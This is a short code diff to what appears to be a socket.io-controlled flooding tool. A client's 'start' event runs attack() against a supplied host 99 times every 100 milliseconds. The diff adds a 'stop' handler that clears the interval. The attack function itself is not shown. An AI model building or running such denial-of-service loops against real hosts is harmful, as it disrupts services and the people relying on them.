@@ -98,18 +98,27 @@ io.on('connection',function (socket) {
 
   socket.on('start',function (u) {
 
-    setInterval(function () {
+   interval = setInterval(function () {
       for (var i = 1; i<100; i++)
         attack(u);
     },100);
 
   });
 
+    socket.on('stop',function (u) {
+
+        if (interval) clearInterval(interval);
+
+    });
+
 
 });
 
 var n = 0;
 var er = 0;
+
+var interval;
+
 
 
 function attack(host) {
